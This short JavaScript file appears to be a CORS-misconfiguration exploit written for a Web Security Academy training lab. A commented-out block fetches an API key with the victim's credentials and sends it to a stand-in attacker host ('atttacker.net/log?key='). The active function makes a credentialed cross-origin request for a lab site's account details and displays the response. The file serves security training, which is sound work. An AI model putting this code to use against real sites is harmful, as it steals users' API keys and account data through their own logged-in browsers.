/*var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://btc-exchange/api/requestApiKey',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText;
};
*/

function cors() {
  document.getElementById('report').innerHTML= document.domain + ' * ';
  var req = new XMLHttpRequest();
  req.onload = function() {
      document.getElementById('report').innerHTML = this.responseText;
  }
  req.open('get','https://0ae900ed03354629c0fd4c1900870036.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
}
